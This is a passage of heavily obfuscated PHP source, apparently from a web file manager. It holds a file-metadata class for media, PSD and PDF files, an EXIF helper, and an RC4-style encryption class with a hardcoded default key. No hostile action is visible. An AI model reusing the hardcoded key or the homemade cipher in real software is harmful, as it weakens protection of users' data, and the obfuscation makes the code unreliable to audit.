$e·Şª—Öî = $bäÁÉ­«Œ÷[1586]; } elseif ($bäÁÉ­«Œ÷[1588] == substr($BÓ—Ëéè³¾, $F­³„Ü·˜, 5)) { $AÛçÏÌ¿æÚ = $bäÁÉ­«Œ÷[1587]; $F­³„Ü·˜ += 5; $e·Şª—Öî = $bäÁÉ­«Œ÷[1588]; } elseif ($bäÁÉ­«Œ÷[1589] == substr($BÓ—Ëéè³¾, $F­³„Ü·˜, 6)) { $AÛçÏÌ¿æÚ = $bäÁÉ­«Œ÷[1589]; $F­³„Ü·˜ += 6; if (1 == preg_match($bäÁÉ­«Œ÷[1590], substr($BÓ—Ëéè³¾, $F­³„Ü·˜), $C›å§µ¥³)) { $F­³„Ü·˜ += strlen($C›å§µ¥³[0]); $a½ƒ±öèÆ = $bäÁÉ­«Œ÷[1591]; $cå£¦…ö¾ = preg_match($a½ƒ±öèÆ, substr($BÓ—Ëéè³¾, $F­³„Ü·˜), $C›å§µ¥³, PREG_OFFSET_CAPTURE); if (1 == $cå£¦…ö¾) { $e·Şª—Öî = substr($BÓ—Ëéè³¾, $F­³„Ü·˜, $C›å§µ¥³[0][1]); $F­³„Ü·˜ += $C›å§µ¥³[1][1]; } } } elseif ($bäÁÉ­«Œ÷[1592] == substr($BÓ—Ëéè³¾, $F­³„Ü·˜, 9)) { $AÛçÏÌ¿æÚ = $bäÁÉ­«Œ÷[1592]; $F­³„Ü·˜ += 9; } elseif (1 == preg_match($bäÁÉ­«Œ÷[1593], substr($BÓ—Ëéè³¾, $F­³„Ü·˜, 33), $C›å§µ¥³)) { $AÛçÏÌ¿æÚ = $bäÁÉ­«Œ÷[1555]; $F­³„Ü·˜ += strlen($C›å§µ¥³[0]); $e·Şª—Öî = intval($C›å§µ¥³[1]) . $bäÁÉ­«Œ÷[80] . intval($C›å§µ¥³[2]); } elseif (1 == preg_match($bäÁÉ­«Œ÷[1594], substr($BÓ—Ëéè³¾, $F­³„Ü·˜, 33), $C›å§µ¥³)) { $AÛçÏÌ¿æÚ = $bäÁÉ­«Œ÷[1595]; $e·Şª—Öî = intval($C›å§µ¥³[1]) . $bäÁÉ­«Œ÷[80] . intval($C›å§µ¥³[2]); $F­³„Ü·˜ += strlen($C›å§µ¥³[0]); } elseif (($FŠõ¨’¨§ = strspn($BÓ—Ëéè³¾, $bäÁÉ­«Œ÷[1596], $F­³„Ü·˜)) > 0) { $AÛçÏÌ¿æÚ = $bäÁÉ­«Œ÷[1597]; $e·Şª—Öî = substr($BÓ—Ëéè³¾, $F­³„Ü·˜, $FŠõ¨’¨§); $F­³„Ü·˜ += $FŠõ¨’¨§; } break; } goto e´¥«„™Õ; A¤¹¡…Ÿí„: $bäÁÉ­«Œ÷ =& $_SERVER[¨¤¼…´]; $AÛçÏÌ¿æÚ = $bäÁÉ­«Œ÷[43]; $e·Şª—Öî = $bäÁÉ­«Œ÷[43]; goto d‡­ÊœÍÅº; Dï’Àß‹‚: } } class GetInfo { private static $fileTypeArray; public static function get($Dá¡³¬Ïª) { $EŒ×»Á¨ = IO::info($Dá¡³¬Ïª); return self::infoAdd($EŒ×»Á¨); } public static function check() { } public static function infoAdd(&$b¤ÇÙŸĞõ±) { goto cÍŒÆñ²Ê; bòš×¤Ÿ„ò: return $b¤ÇÙŸĞõ±; goto bè •·¼²; cÍŒÆñ²Ê: $e£é¶¡¿Êä =& $_SERVER[¨¤¼…´]; static $DºŒØÏæ§; if (!$DºŒØÏæ§) { require SDK_DIR . $e£é¶¡¿Êä[1598]; $DºŒØÏæ§ = new getID3(); } goto dì“²Š‡ÆÊ; E¨ö„¯„Åá: $Fáöùô„…© = $b¤ÇÙŸĞõ±[$e£é¶¡¿Êä[175]]; try { if ($b¤ÇÙŸĞõ±[$e£é¶¡¿Êä[175]] == $e£é¶¡¿Êä[1600]) { $BÄ÷¯™¢šÄ = self::psdParse($FÏ‹µì”Íó); $Fáöùô„…© = $e£é¶¡¿Êä[1601]; } else { if ($b¤ÇÙŸĞõ±[$e£é¶¡¿Êä[175]] == $e£é¶¡¿Êä[1602]) { $BÄ÷¯™¢šÄ = self::pdfParse($FÏ‹µì”Íó); } else { $Fáöùô„…© = self::$fileTypeArray[$e£é¶¡¿Êä[1603]][$b¤ÇÙŸĞõ±[$e£é¶¡¿Êä[175]]]; $A…‰àÜòÜÚ = self::$fileTypeArray[$e£é¶¡¿Êä[1604]][$Fáöùô„…©][$e£é¶¡¿Êä[1605]]; $bÑ„“ÀìÒÍ = @$DºŒØÏæ§->analyze($FÏ‹µì”Íó, $b¤ÇÙŸĞõ±[$e£é¶¡¿Êä[87]], $b¤ÇÙŸĞõ±[$e£é¶¡¿Êä[38]]); $BÄ÷¯™¢šÄ = self::parseData($bÑ„“ÀìÒÍ, $A…‰àÜòÜÚ, $b¤ÇÙŸĞõ±); } } } catch (Exception $F‘ôÛæñˆ³) { $BÄ÷¯™¢šÄ = array($e£é¶¡¿Êä[384] => $Fáöùô„…©); } if (!$BÄ÷¯™¢šÄ) { return; } goto CÔé‰ôÔ¬; dì“²Š‡ÆÊ: if (!$b¤ÇÙŸĞõ± || $b¤ÇÙŸĞõ±[$e£é¶¡¿Êä[39]] != $e£é¶¡¿Êä[181]) { return; } if (!self::support($b¤ÇÙŸĞõ±[$e£é¶¡¿Êä[175]]) || isset($b¤ÇÙŸĞõ±[$e£é¶¡¿Êä[170]])) { return; } $FÏ‹µì”Íó = $e£é¶¡¿Êä[1599] . $b¤ÇÙŸĞõ±[$e£é¶¡¿Êä[85]]; goto E¨ö„¯„Åá; CÔé‰ôÔ¬: $BÄ÷¯™¢šÄ = self::arrayValueLimit($BÄ÷¯™¢šÄ); $BÄ÷¯™¢šÄ[$e£é¶¡¿Êä[384]] = $Fáöùô„…©; $b¤ÇÙŸĞõ±[$e£é¶¡¿Êä[170]] = $BÄ÷¯™¢šÄ; goto bòš×¤Ÿ„ò; bè •·¼²: } public static function support($AÏÕ¼½è) { goto C…Ãªë†›‘; C…Ãªë†›‘: $FÑ½°§”ÕÏ =& $_SERVER[¨¤¼…´]; if (!self::$fileTypeArray) { self::$fileTypeArray = self::fileTypeParse(); } $AÏÕ¼½è = strtolower($AÏÕ¼½è); goto CœÁÇáôÇ‚; däÊáÅºÎ: return !1; goto B¢ï‚Ó­¿ê; CœÁÇáôÇ‚: $B…¬Ü™Å¸› = array($FÑ½°§”ÕÏ[1602], $FÑ½°§”ÕÏ[1600]); if (in_array($AÏÕ¼½è, $B…¬Ü™Å¸›)) { return !0; } if (isset(self::$fileTypeArray[$FÑ½°§”ÕÏ[1603]][$AÏÕ¼½è])) { return !0; } goto däÊáÅºÎ; B¢ï‚Ó­¿ê: } public static function arrayValueLimit($D¤ÍÊŠˆá›, $a™ÈñƒÊšë = 5000) { if (!is_array($D¤ÍÊŠˆá›)) { return $D¤ÍÊŠˆá›; } foreach ($D¤ÍÊŠˆá› as $B§İî¯‘ => $D„²«à†´¯) { if (is_string($D„²«à†´¯) && strlen($D„²«à†´¯) > $a™ÈñƒÊšë) { $D¤ÍÊŠˆá›[$B§İî¯‘] = substr($D„²«à†´¯, 0, $a™ÈñƒÊšë); } else { if (is_array($D„²«à†´¯)) { $D¤ÍÊŠˆá›[$B§İî¯‘] = self::arrayValueLimit($D„²«à†´¯, $a™ÈñƒÊšë); } } } return $D¤ÍÊŠˆá›; } private static function parseData($d¿±·¥ï°, $CÔÆÃˆºÃ, $D‰“ø¼ÍºÁ) { $AŒà£†´»ñ =& $_SERVER[¨¤¼…´]; $díƒë«ƒÖá = $d¿±·¥ï°[$AŒà£†´»ñ[1606]]; $F¼±·‡ÅÙÀ = array(); foreach ($CÔÆÃˆºÃ as $aâÂÙ¼Ù¶µ => $BÀĞŸó øš) { foreach ($BÀĞŸó øš as $C§çãŞÖíÜ) { if (is_array($C§çãŞÖíÜ)) { $A¹±Ìå·¹„ = self::parseData($d¿±·¥ï°, $BÀĞŸó øš, $D‰“ø¼ÍºÁ); if ($A¹±Ìå·¹„) { $F¼±·‡ÅÙÀ[$aâÂÙ¼Ù¶µ] = $A¹±Ìå·¹„; } break; } $aæ¿å¦ÉÀ† = str_replace($AŒà£†´»ñ[1378], $díƒë«ƒÖá, $C§çãŞÖíÜ); $A¹±Ìå·¹„ = _get($d¿±·¥ï°, $aæ¿å¦ÉÀ†); $A¹±Ìå·¹„ = is_array($A¹±Ìå·¹„) ? $A¹±Ìå·¹„[0] : $A¹±Ìå·¹„; if ($A¹±Ìå·¹„) { break; } } if ($A¹±Ìå·¹„ || $A¹±Ìå·¹„ === 0 || $A¹±Ìå·¹„ === !1) { $A¹±Ìå·¹„ = self::valueReset($C§çãŞÖíÜ, $A¹±Ìå·¹„, $aâÂÙ¼Ù¶µ); if ($A¹±Ìå·¹„ !== null) { $F¼±·‡ÅÙÀ[$aâÂÙ¼Ù¶µ] = $A¹±Ìå·¹„; } } } $F¼±·‡ÅÙÀ = self::valueResetAll($F¼±·‡ÅÙÀ, $D‰“ø¼ÍºÁ); return $F¼±·‡ÅÙÀ; } private static function psdParse($c¦¤ØÓ©ğ) { $cÕƒ÷ˆ¿æ’ =& $_SERVER[¨¤¼…´]; if (IO::fileSubstr($c¦¤ØÓ©ğ, 0, 4) != $cÕƒ÷ˆ¿æ’[1607]) { return !1; } $D‘õåëñºø = getImageSize($c¦¤ØÓ©ğ, $bÇ‚Ê¯Å–); if (!$D‘õåëñºø) { return; } $aÒ°Î‰ÇÅÎ = array($cÕƒ÷ˆ¿æ’[172] => $D‘õåëñºø[0], $cÕƒ÷ˆ¿æ’[173] => $D‘õåëñºø[1]); return $aÒ°Î‰ÇÅÎ; } private static function pdfParse($C¨·Åå‚Ë¼) { return FileParsePdf::parse($C¨·Åå‚Ë¼); } private static function fileTypeParse() { $B‚ÄĞê‡™‘ =& $_SERVER[¨¤¼…´]; $b…œ„©Ñ‚ñ = self::fileTypeArray(); $BÇôöË·÷‚ = array(); foreach ($b…œ„©Ñ‚ñ as $c“Š¥Ñäã± => $d·ôÍŠÏ‡) { $A÷öÊçëŒè = _get($d·ôÍŠÏ‡, $B‚ÄĞê‡™‘[175], $B‚ÄĞê‡™‘[43]); $C•Š…Ê¸ç = is_string($A÷öÊçëŒè) ? explode($B‚ÄĞê‡™‘[57], $A÷öÊçëŒè) : $A÷öÊçëŒè; if (!$C•Š…Ê¸ç) { continue; } foreach ($C•Š…Ê¸ç as $A÷öÊçëŒè) { $A÷öÊçëŒè = strtolower(trim($A÷öÊçëŒè)); if (!$A÷öÊçëŒè) { continue; } $BÇôöË·÷‚[$A÷öÊçëŒè] = $c“Š¥Ñäã±; } $b…œ„©Ñ‚ñ[$c“Š¥Ñäã±][$B‚ÄĞê‡™‘[175]] = array_keys($BÇôöË·÷‚); $b…œ„©Ñ‚ñ[$c“Š¥Ñäã±][$B‚ÄĞê‡™‘[1605]] = self::parseKeyMap($d·ôÍŠÏ‡[$B‚ÄĞê‡™‘[1605]]); } return array($B‚ÄĞê‡™‘[1604] => $b…œ„©Ñ‚ñ, $B‚ÄĞê‡™‘[1603] => $BÇôöË·÷‚); } private static function parseKeyMap($d†¼“¾¡È) { $d®õÜ³Èˆâ =& $_SERVER[¨¤¼…´]; foreach ($d†¼“¾¡È as $aŠÒ„Œ±¢ => $bè…›îÏ§ô) { if (is_array($bè…›îÏ§ô)) { $Bä¹å’¥Ã¸ = self::parseKeyMap($bè…›îÏ§ô); if ($Bä¹å’¥Ã¸) { $d†¼“¾¡È[$aŠÒ„Œ±¢] = $Bä¹å’¥Ã¸; } continue; } $CÂÖ“ƒ„ãª = explode($d®õÜ³Èˆâ[57], $bè…›îÏ§ô); $bé¯‡³å¢³ = array(); foreach ($CÂÖ“ƒ„ãª as $FÛ®™ªƒºø) { $FÛ®™ªƒºø = trim($FÛ®™ªƒºø); if (!$FÛ®™ªƒºø) { continue; } if (preg_match($d®õÜ³Èˆâ[1608], $FÛ®™ªƒºø, $aá¶À†Ö«)) { $C…ƒ‡×Ğ…’ = explode($d®õÜ³Èˆâ[284], $aá¶À†Ö«[1]); foreach ($C…ƒ‡×Ğ…’ as $AÕ×í±¡½’) { $bé¯‡³å¢³[] = str_replace($aá¶À†Ö«[0], $AÕ×í±¡½’, $FÛ®™ªƒºø); } } else { $bé¯‡³å¢³[] = $FÛ®™ªƒºø; } } $d†¼“¾¡È[$aŠÒ„Œ±¢] = $bé¯‡³å¢³; } return $d†¼“¾¡È; } private static function valueResetAll($A‘¡»·‹İÙ, $d¥ääß¥ó’) { goto D¶½„Øß‘; C¾šù²ª½‚: if ($EÅŠå‘ƒ•) { $Eç‚Á¸ÕÀ³ = IO_PATH_SYSTEM_TEMP . $bõ¬‡ƒÑ»[1614] . KodIO::hashPath($d¥ääß¥ó’) . $bõ¬‡ƒÑ»[1615]; $A‘¡»·‹İÙ[$bõ¬‡ƒÑ»[1616]] = Action($bõ¬‡ƒÑ»[1617])->pluginCacheFileSet($Eç‚Á¸ÕÀ³, $EÅŠå‘ƒ•); unset($A‘¡»·‹İÙ[$bõ¬‡ƒÑ»[1618]][$bõ¬‡ƒÑ»[1601]]); } $Aº™ëğŠÛ¦ = _get($A‘¡»·‹İÙ, $bõ¬‡ƒÑ»[1619], $bõ¬‡ƒÑ»[43]); $e¶¿¾ê = _get($A‘¡»·‹İÙ, $bõ¬‡ƒÑ»[1620], $bõ¬‡ƒÑ»[43]); goto eŠÇÊÍóÛˆ; D¶½„Øß‘: $bõ¬‡ƒÑ» =& $_SERVER[¨¤¼…´]; if (isset($A‘¡»·‹İÙ[$bõ¬‡ƒÑ»[1609]])) { $B”Öë£ì‹Ğ = ceil($A‘¡»·‹İÙ[$bõ¬‡ƒÑ»[1609]]); $c İ®§¢ÅÊ = intval($B”Öë£ì‹Ğ / 3600); $cí¨¼Î³Õš = intval(($B”Öë£ì‹Ğ - $c İ®§¢ÅÊ * 3600) / 60); $BÌÀ‹­„ƒ = $B”Öë£ì‹Ğ % 60; $A‘¡»·‹İÙ[$bõ¬‡ƒÑ»[1610]] = sprintf($bõ¬‡ƒÑ»[1611], $c İ®§¢ÅÊ, $cí¨¼Î³Õš, $BÌÀ‹­„ƒ); if ($c İ®§¢ÅÊ == 0) { $A‘¡»·‹İÙ[$bõ¬‡ƒÑ»[1610]] = sprintf($bõ¬‡ƒÑ»[1612], $cí¨¼Î³Õš, $BÌÀ‹­„ƒ); } } $EÅŠå‘ƒ• = _get($A‘¡»·‹İÙ, $bõ¬‡ƒÑ»[1613]); goto C¾šù²ª½‚; eŠÇÊÍóÛˆ: $c¢ô¿çØ‹ = _get($A‘¡»·‹İÙ, $bõ¬‡ƒÑ»[1621], $bõ¬‡ƒÑ»[43]); $B¯–±ÂÙÕ = $Aº™ëğŠÛ¦ . $e¶¿¾ê . $c¢ô¿çØ‹; if ($B¯–±ÂÙÕ && get_charset($B¯–±ÂÙÕ) != $bõ¬‡ƒÑ»[339]) { $A‘¡»·‹İÙ[$bõ¬‡ƒÑ»[1618]][$bõ¬‡ƒÑ»[1331]] = iconv_to($A‘¡»·‹İÙ[$bõ¬‡ƒÑ»[1618]][$bõ¬‡ƒÑ»[1331]], get_charset($B¯–±ÂÙÕ), $bõ¬‡ƒÑ»[339]); $A‘¡»·‹İÙ[$bõ¬‡ƒÑ»[1618]][$bõ¬‡ƒÑ»[1622]] = iconv_to($A‘¡»·‹İÙ[$bõ¬‡ƒÑ»[1618]][$bõ¬‡ƒÑ»[1622]], get_charset($B¯–±ÂÙÕ), $bõ¬‡ƒÑ»[339]); $A‘¡»·‹İÙ[$bõ¬‡ƒÑ»[1618]][$bõ¬‡ƒÑ»[1623]] = iconv_to($A‘¡»·‹İÙ[$bõ¬‡ƒÑ»[1618]][$bõ¬‡ƒÑ»[1623]], get_charset($B¯–±ÂÙÕ), $bõ¬‡ƒÑ»[339]); } goto eÔ¼ˆ•·; eÔ¼ˆ•·: return $A‘¡»·‹İÙ; goto d¥ÈŒ‡„‹; d¥ÈŒ‡„‹: } private static function valueReset($bßÇ‹ÚÜ¼, $CÙ»¬ÀÎùÉ, $E­õÁÕªµ) { $cÇÔîÌ¸ =& $_SERVER[¨¤¼…´]; $Fù·Ş›« = $cÇÔîÌ¸[1539]; switch ($bßÇ‹ÚÜ¼) { case $cÇÔîÌ¸[1624]: $CÙ»¬ÀÎùÉ = $CÙ»¬ÀÎùÉ == $cÇÔîÌ¸[93] ? $cÇÔîÌ¸[1625] : $cÇÔîÌ¸[1626]; break; case $cÇÔîÌ¸[1627]: $CÙ»¬ÀÎùÉ = $CÙ»¬ÀÎùÉ ? $CÙ»¬ÀÎùÉ : null; break; default: break; } switch ($E­õÁÕªµ) { case $cÇÔîÌ¸[1628]: $CÙ»¬ÀÎùÉ = round($CÙ»¬ÀÎùÉ, 2); break; case $cÇÔîÌ¸[201]: case $cÇÔîÌ¸[117]: if ($CÙ»¬ÀÎùÉ < 0) { $CÙ»¬ÀÎùÉ = null; } else { if (is_numeric($CÙ»¬ÀÎùÉ)) { $CÙ»¬ÀÎùÉ = date($Fù·Ş›«, $CÙ»¬ÀÎùÉ); } } break; default: break; } return $CÙ»¬ÀÎùÉ; } private static function fileTypeArray() { $f”ù¤˜ã¦¸ =& $_SERVER[¨¤¼…´]; return array($f”ù¤˜ã¦¸[1601] => array($f”ù¤˜ã¦¸[175] => $f”ù¤˜ã¦¸[1629] . $f”ù¤˜ã¦¸[1630], $f”ù¤˜ã¦¸[1605] => array($f”ù¤˜ã¦¸[172] => $f”ù¤˜ã¦¸[1631], $f”ù¤˜ã¦¸[173] => $f”ù¤˜ã¦¸[1632], $f”ù¤˜ã¦¸[1633] => $f”ù¤˜ã¦¸[1634], $f”ù¤˜ã¦¸[1635] => $f”ù¤˜ã¦¸[1636], $f”ù¤˜ã¦¸[201] => $f”ù¤˜ã¦¸[1637], $f”ù¤˜ã¦¸[117] => $f”ù¤˜ã¦¸[1638], $f”ù¤˜ã¦¸[1639] => $f”ù¤˜ã¦¸[1640], $f”ù¤˜ã¦¸[1641] => $f”ù¤˜ã¦¸[1642], $f”ù¤˜ã¦¸[1643] => $f”ù¤˜ã¦¸[1644], $f”ù¤˜ã¦¸[1645] => $f”ù¤˜ã¦¸[1646], $f”ù¤˜ã¦¸[1647] => $f”ù¤˜ã¦¸[1648], $f”ù¤˜ã¦¸[1649] => $f”ù¤˜ã¦¸[1650], $f”ù¤˜ã¦¸[1651] => $f”ù¤˜ã¦¸[1652], $f”ù¤˜ã¦¸[1653] => array($f”ù¤˜ã¦¸[1654] => $f”ù¤˜ã¦¸[1655], $f”ù¤˜ã¦¸[1656] => $f”ù¤˜ã¦¸[1657], $f”ù¤˜ã¦¸[1658] => $f”ù¤˜ã¦¸[1659]), $f”ù¤˜ã¦¸[1660] => $f”ù¤˜ã¦¸[1661], $f”ù¤˜ã¦¸[1662] => $f”ù¤˜ã¦¸[1663], $f”ù¤˜ã¦¸[1664] => $f”ù¤˜ã¦¸[1665], $f”ù¤˜ã¦¸[1666] => $f”ù¤˜ã¦¸[1667], $f”ù¤˜ã¦¸[1668] => array($f”ù¤˜ã¦¸[1669] => $f”ù¤˜ã¦¸[1670], $f”ù¤˜ã¦¸[1671] => $f”ù¤˜ã¦¸[1672], $f”ù¤˜ã¦¸[1673] => $f”ù¤˜ã¦¸[1674], $f”ù¤˜ã¦¸[1675] => $f”ù¤˜ã¦¸[1676], $f”ù¤˜ã¦¸[1677] => $f”ù¤˜ã¦¸[1678], $f”ù¤˜ã¦¸[1679] => $f”ù¤˜ã¦¸[1680], $f”ù¤˜ã¦¸[1681] => $f”ù¤˜ã¦¸[1682], $f”ù¤˜ã¦¸[1683] => $f”ù¤˜ã¦¸[1684], $f”ù¤˜ã¦¸[1685] => $f”ù¤˜ã¦¸[1686], $f”ù¤˜ã¦¸[1687] => $f”ù¤˜ã¦¸[1688], $f”ù¤˜ã¦¸[1689] => $f”ù¤˜ã¦¸[1690]))), $f”ù¤˜ã¦¸[1691] => array($f”ù¤˜ã¦¸[175] => $f”ù¤˜ã¦¸[1692] . $f”ù¤˜ã¦¸[1693], $f”ù¤˜ã¦¸[1605] => array($f”ù¤˜ã¦¸[1609] => $f”ù¤˜ã¦¸[1694], $f”ù¤˜ã¦¸[201] => $f”ù¤˜ã¦¸[1695], $f”ù¤˜ã¦¸[117] => $f”ù¤˜ã¦¸[1696], $f”ù¤˜ã¦¸[1641] => $f”ù¤˜ã¦¸[1697], $f”ù¤˜ã¦¸[1698] => $f”ù¤˜ã¦¸[1699], $f”ù¤˜ã¦¸[1700] => $f”ù¤˜ã¦¸[1627], $f”ù¤˜ã¦¸[1701] => $f”ù¤˜ã¦¸[1702], $f”ù¤˜ã¦¸[1703] => $f”ù¤˜ã¦¸[1704], $f”ù¤˜ã¦¸[1705] => $f”ù¤˜ã¦¸[1706], $f”ù¤˜ã¦¸[1618] => array($f”ù¤˜ã¦¸[1331] => $f”ù¤˜ã¦¸[1707], $f”ù¤˜ã¦¸[1622] => $f”ù¤˜ã¦¸[1708], $f”ù¤˜ã¦¸[1623] => $f”ù¤˜ã¦¸[1709], $f”ù¤˜ã¦¸[1710] => $f”ù¤˜ã¦¸[1711], $f”ù¤˜ã¦¸[1712] => $f”ù¤˜ã¦¸[1713], $f”ù¤˜ã¦¸[1714] => $f”ù¤˜ã¦¸[1715], $f”ù¤˜ã¦¸[1601] => $f”ù¤˜ã¦¸[1716]))), $f”ù¤˜ã¦¸[1717] => array($f”ù¤˜ã¦¸[175] => $f”ù¤˜ã¦¸[1718] . $f”ù¤˜ã¦¸[1719], $f”ù¤˜ã¦¸[1605] => array($f”ù¤˜ã¦¸[172] => $f”ù¤˜ã¦¸[1720], $f”ù¤˜ã¦¸[173] => $f”ù¤˜ã¦¸[1721], $f”ù¤˜ã¦¸[1609] => $f”ù¤˜ã¦¸[1694], $f”ù¤˜ã¦¸[201] => $f”ù¤˜ã¦¸[1722], $f”ù¤˜ã¦¸[117] => $f”ù¤˜ã¦¸[1723], $f”ù¤˜ã¦¸[1628] => $f”ù¤˜ã¦¸[1724], $f”ù¤˜ã¦¸[1705] => $f”ù¤˜ã¦¸[1725], $f”ù¤˜ã¦¸[1701] => $f”ù¤˜ã¦¸[1726], $f”ù¤˜ã¦¸[1641] => $f”ù¤˜ã¦¸[1727], $f”ù¤˜ã¦¸[1691] => array($f”ù¤˜ã¦¸[1700] => $f”ù¤˜ã¦¸[1627], $f”ù¤˜ã¦¸[1728] => $f”ù¤˜ã¦¸[1729], $f”ù¤˜ã¦¸[1698] => $f”ù¤˜ã¦¸[1699], $f”ù¤˜ã¦¸[1705] => $f”ù¤˜ã¦¸[1706], $f”ù¤˜ã¦¸[1701] => $f”ù¤˜ã¦¸[1730], $f”ù¤˜ã¦¸[1703] => $f”ù¤˜ã¦¸[1704]))), $f”ù¤˜ã¦¸[1731] => array($f”ù¤˜ã¦¸[1605] => array($f”ù¤˜ã¦¸[1732] => $f”ù¤˜ã¦¸[1733], $f”ù¤˜ã¦¸[1734] => $f”ù¤˜ã¦¸[1735])), $f”ù¤˜ã¦¸[1736] => array($f”ù¤˜ã¦¸[1605] => array())); } } function exif_read_data_io($Fö«Š¹¤, $bº§”Ã­§ò = null, $CõÆÀ‹¿¥Ñ = false, $aƒ¡¾À³¦‹ = false) { $bæñä¹ğ¾‚ = StreamWrapperIO::read($Fö«Š¹¤, 0, 1024 * 64); $cğå‰—óùÖ = $_SERVER[¨¤¼…´][1737] . base64_encode($bæñä¹ğ¾‚); return exif_read_data($cğå‰—óùÖ, $bº§”Ã­§ò, $CõÆÀ‹¿¥Ñ, $aƒ¡¾À³¦‹); } goto AàÏ»‘äÍ; b³È•—–¦: class Mcrypt { public static $defaultKey = "\x61\x21\164\x61\153\101\x3a\x64\x6c\155\x63\154\144\105\x76\54\145"; public static function encode($Bƒ„ŒÏÁ«, $CŠğ™ìÒÙ = '', $a„Ÿ³ŞÙ²¨ = 0, $Dñì¾™àÁİ = '') { goto D…¿ğ†ºƒˆ; D…¿ğ†ºƒˆ: $E‹•Ò÷ÌÌ˜ =& $_SERVER[¨¤¼…´]; $fê¾‰íÛáÒ = 4; $CŠğ™ìÒÙ = md5($CŠğ™ìÒÙ ? $CŠğ™ìÒÙ : self::$defaultKey); goto AÏÊ…†ä; F™ìÓÕ“: for ($AÖ«çÄóİ¼ = 0; $AÖ«çÄóİ¼ <= 255; $AÖ«çÄóİ¼++) { $BÁï§©·¶[$AÖ«çÄóİ¼] = ord($e›ˆ“Ã–ÇË[$AÖ«çÄóİ¼ % $f®ó‘ğáÅÈ]); } $E½…ÔŠœ‚‡ = range(0, 255); for ($CÏ·„öƒ¹ò = $AÖ«çÄóİ¼ = 0; $AÖ«çÄóİ¼ < 256; $AÖ«çÄóİ¼++) { $CÏ·„öƒ¹ò = ($CÏ·„öƒ¹ò + $E½…ÔŠœ‚‡[$AÖ«çÄóİ¼] + $BÁï§©·¶[$AÖ«çÄóİ¼]) % 256; $f›ÀÔØĞ¦§ = $E½…ÔŠœ‚‡[$AÖ«çÄóİ¼]; $E½…ÔŠœ‚‡[$AÖ«çÄóİ¼] = $E½…ÔŠœ‚‡[$CÏ·„öƒ¹ò]; $E½…ÔŠœ‚‡[$CÏ·„öƒ¹ò] = $f›ÀÔØĞ¦§; } goto F¤½‚ñ˜Ö; AÏÊ…†ä: $aĞ÷¡Œ— = md5(substr($CŠğ™ìÒÙ, 0, 16)); $aİîƒÄÆ” = md5(substr($CŠğ™ìÒÙ, 16, 16)); $Dñì¾™àÁİ = $Dñì¾™àÁİ ? $Dñì¾™àÁİ : md5(microtime()); goto fÂİê„ÍË; d¡Æ¾¯“á: $Bƒ„ŒÏÁ« = sprintf($E‹•Ò÷ÌÌ˜[1920], $a„Ÿ³ŞÙ²¨ ? $a„Ÿ³ŞÙ²¨ + time() : 0) . substr(md5($Bƒ„ŒÏÁ« . $aİîƒÄÆ”), 0, 16) . $Bƒ„ŒÏÁ«; $AÍå‡ŸŠâ× = strlen($Bƒ„ŒÏÁ«); $BÁï§©·¶ = array(); goto F™ìÓÕ“; FáçâÎ’›: $A×ÈïÂÔé = str_replace(array($E‹•Ò÷ÌÌ˜[297], $E‹•Ò÷ÌÌ˜[8], $E‹•Ò÷ÌÌ˜[893]), array($E‹•Ò÷ÌÌ˜[424], $E‹•Ò÷ÌÌ˜[80], $E‹•Ò÷ÌÌ˜[101]), $A×ÈïÂÔé); return $A×ÈïÂÔé; goto e²î¡×¥—; fÂİê„ÍË: $B‡£‘ë‘Å = substr($Dñì¾™àÁİ, -$fê¾‰íÛáÒ); $e›ˆ“Ã–ÇË = $aĞ÷¡Œ— . md5($aĞ÷¡Œ— . $B‡£‘ë‘Å); $f®ó‘ğáÅÈ = strlen($e›ˆ“Ã–ÇË); goto d¡Æ¾¯“á; F¤½‚ñ˜Ö: $A×ÈïÂÔé = $E‹•Ò÷ÌÌ˜[43]; for ($c»®©…¬„¹ = $CÏ·„öƒ¹ò = $AÖ«çÄóİ¼ = 0; $AÖ«çÄóİ¼ < $AÍå‡ŸŠâ×; $AÖ«çÄóİ¼++) { $c»®©…¬„¹ = ($c»®©…¬„¹ + 1) % 256; $CÏ·„öƒ¹ò = ($CÏ·„öƒ¹ò + $E½…ÔŠœ‚‡[$c»®©…¬„¹]) % 256; $f›ÀÔØĞ¦§ = $E½…ÔŠœ‚‡[$c»®©…¬„¹]; $E½…ÔŠœ‚‡[$c»®©…¬„¹] = $E½…ÔŠœ‚‡[$CÏ·„öƒ¹ò]; $E½…ÔŠœ‚‡[$CÏ·„öƒ¹ò] = $f›ÀÔØĞ¦§; $A×ÈïÂÔé .= chr(ord($Bƒ„ŒÏÁ«[$AÖ«çÄóİ¼]) ^ $E½…ÔŠœ‚‡[($E½…ÔŠœ‚‡[$c»®©…¬„¹] + $E½…ÔŠœ‚‡[$CÏ·„öƒ¹ò]) % 256]); } $A×ÈïÂÔé = $B‡£‘ë‘Å . str_replace($E‹•Ò÷ÌÌ˜[893], $E‹•Ò÷ÌÌ˜[43], base64_encode($A×ÈïÂÔé)); goto FáçâÎ’›; e²î¡×¥—: } public static function decode($BÏÈ¹Š©¿’, $dÊùİÓöøë = '') { goto eŒÂŠ¥À™±; CÜÖ£Íª: for ($e§¦­²¦Ñ = 0; $e§¦­²¦Ñ <= 255; $e§¦­²¦Ñ++) { $f”êù—Û¥[$e§¦­²¦Ñ] = ord($b«Â ‚·„[$e§¦­²¦Ñ % $c¬ôÆÌªø]); } $B„†¯­µ Ô = range(0, 255); for ($BöêÊÆõí¿ = $e§¦­²¦Ñ = 0; $e§¦­²¦Ñ < 256; $e§¦­²¦Ñ++) { $BöêÊÆõí¿ = ($BöêÊÆõí¿ + $B„†¯­µ Ô[$e§¦­²¦Ñ] + $f”êù—Û¥[$e§¦­²¦Ñ]) % 256; $e‰ƒ¥›£Ÿ = $B„†¯­µ Ô[$e§¦­²¦Ñ]; $B„†¯­µ Ô[$e§¦­²¦Ñ] = $B„†¯­µ Ô[$BöêÊÆõí¿]; $B„†¯­µ Ô[$BöêÊÆõí¿] = $e‰ƒ¥›£Ÿ; } goto E¡šó¶©­; aè²°½Áê‹: $b×Ï™’Î¦ö = substr($BÏÈ¹Š©¿’, 0, $A—˜È¡ˆ·ì); $b«Â ‚·„ = $cõ…’Ü£•Õ . md5($cõ…’Ü£•Õ . $b×Ï™’Î¦ö); $c¬ôÆÌªø = strlen($b«Â ‚·„); goto C‹Á§–ù†ã; E¡šó¶©­: $F”ïïï¼– = $DÆÇÂ¤œîï[43]; for ($c»ÏåØ…Š = $BöêÊÆõí¿ = $e§¦­²¦Ñ = 0; $e§¦­²¦Ñ < $f£ÏÂÒ…÷¡; $e§¦­²¦Ñ++) { $c»ÏåØ…Š = 